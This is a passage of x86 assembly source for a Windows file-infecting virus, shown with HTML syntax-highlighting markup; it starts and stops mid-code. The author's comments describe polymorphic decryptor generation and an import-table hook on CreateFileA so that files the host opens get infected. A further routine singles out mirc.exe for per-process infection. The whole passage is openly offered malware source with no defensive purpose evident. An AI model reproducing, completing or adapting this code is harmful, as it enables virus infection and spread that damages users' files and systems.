</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">D1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">D2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">D1</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">D1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc1">;81h 74h (important byte) FCh KEY</span><span class="sc0">
</span><span class="sc1">;we must change registers in the important byte</span><span class="sc0">
</span><span class="sc5">D2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;zdec poly</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">zdec</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">E1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">E2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;zor poly</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">zor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">F1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">F1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">F2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">F1</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">F1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">F2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;HookCreateFileA hooks CreateFileA api for current host and when host call CreateFileA</span><span class="sc0">
</span><span class="sc1">;then hook-code take control and infect the file than is passed to CreateFileA as parameter.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;    eax = kernel</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;    none</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">HookCreateFileA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetModuleHandleACRC</span><span class="sc4">,</span><span class="sc5">GMHNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
</span><span class="sc1">;eax = this module</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc1">;IAT</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;edx -&gt; IAT</span><span class="sc0">
</span><span class="sc1">;ebx -&gt; MZ</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">SearchInIAT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc1">;name of dll</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">endHook</span><span class="sc1">;if last and no found then we go out...however its very unprobable program doesnt</span><span class="sc0">
         </span><span class="sc1">;import no functions from kernel </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernelBuf</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">toLower</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">;becoz i have CRC of 'kernel32' string and ill search with CRC</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">toLower</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Kernel32CRC</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchInIAT</span><span class="sc0">
</span><span class="sc1">;edx = kernel entry in IAT</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;edx = array of names of kernel32</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SearchCreateFileA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc1">;name of api</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">   </span><span class="sc5">endHookWithPop</span><span class="sc0"> </span><span class="sc1">;if last and no found CreateFileA we go out </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0">
</span><span class="sc1">;esi -&gt; name</span><span class="sc0">
</span><span class="sc1">;ecx = len</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0"> </span><span class="sc1">;i search CreateFile by CRC too</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateFileACRC</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchCreateFileA</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc1">;start of array</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;dword ptr [eax] = dir of CreateFileA</span><span class="sc0">
</span><span class="sc1">;we must overwrite this dir with our hook rutine ;)</span><span class="sc0">
</span><span class="sc1">;i think that unprotect mem its not necessary becoz loader must write that dir</span><span class="sc0">
</span><span class="sc1">;however ill unprotect it</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">UnprotectMem</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">HookRutine</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">;i put over CreateFileA dir my hook rutine dir ;)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateFileACRC</span><span class="sc4">,</span><span class="sc5">CFNameLen</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileADir</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;ill need in hook rutine</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FindFirstFileACRC</span><span class="sc4">,</span><span class="sc5">FFFNameLen</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFirstFileADir</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;ill need it in hook rutine and i wanna be fast so ill</span><span class="sc0">
                                  </span><span class="sc1">;calc it here and i keep it</span><span class="sc0">
</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">endHook</span><span class="sc0">
</span><span class="sc5">endHookWithPop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">endHook</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">kernelBuf</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">HookRutine</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">pushfd</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">HookdOff</span><span class="sc0">
</span><span class="sc5">HookdOff</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookdOff</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileADir</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;for next ret jumps CreateFileA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc1">;file</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFirstFileADir</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;callz InfectIt</span><span class="sc0">

</span><span class="sc6">popfd</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc1">;i have push eax but later i have change [esp + 24h] to CreateFileA dir so</span><span class="sc0">
   </span><span class="sc1">;with a ret program will jmp to CreateFileA ;)</span><span class="sc0">

</span><span class="sc5">CreateFileADir</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirstFileADir</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">



</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;TestFile will test WIN32_FIND_DATA to see if current file found is mirc.exe or other</span><span class="sc0">
</span><span class="sc1">;typical irc programs and later infect them with per-process characteristic.</span><span class="sc0">
</span><span class="sc1">;In addition it tests if file is explorer.exe for not infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in:none</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;out: eax = 1 infect with per-process / eax = 0 not necesary perprocess  / eax = -1 no infect</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">TestFile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;When i began to code perprocess part i though to search recursively some programs</span><span class="sc0">
</span><span class="sc1">;in hard disk(mirc.exe,messenger and others) for infecting it with perprocess,but finally</span><span class="sc0">
</span><span class="sc1">;i decide if i found some of that programs,then i infect them with perprocess but i</span><span class="sc0">
</span><span class="sc1">;dont search them.I think if i infect some specific programs with perprocess for </span><span class="sc0">
</span><span class="sc1">;increasing infection capability im not coding a worm,however if i search programs for</span><span class="sc0">
</span><span class="sc1">;modifing them for virus was sent by irc or mail or other,then im coding a worm.This is </span><span class="sc0">
</span><span class="sc1">;only a mania,i dont want my virus was a worm :P,only that.</span><span class="sc0">

</span><span class="sc5">mircCRC</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7c55758dh</span><span class="sc0">  </span><span class="sc1">; CRC of 'mirc.exe'</span><span class="sc0">
</span><span class="sc5">explorerCRC</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0be037055h</span><span class="sc0"> </span><span class="sc1">; CRC of 'explorer.exe'</span><span class="sc0">



</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">ToLowerFileName</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">EndToLower</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'A'</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ToLowerFileName</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
</span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">ToLowerFileName</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ToLowerFileName</span><span class="sc0">
</span><span class="sc5">EndToLower</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
</span><span class="sc1">;eax = CRC of file name</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mircCRC</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">retPerProcess</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">explorerCRC</span><span class="sc0">
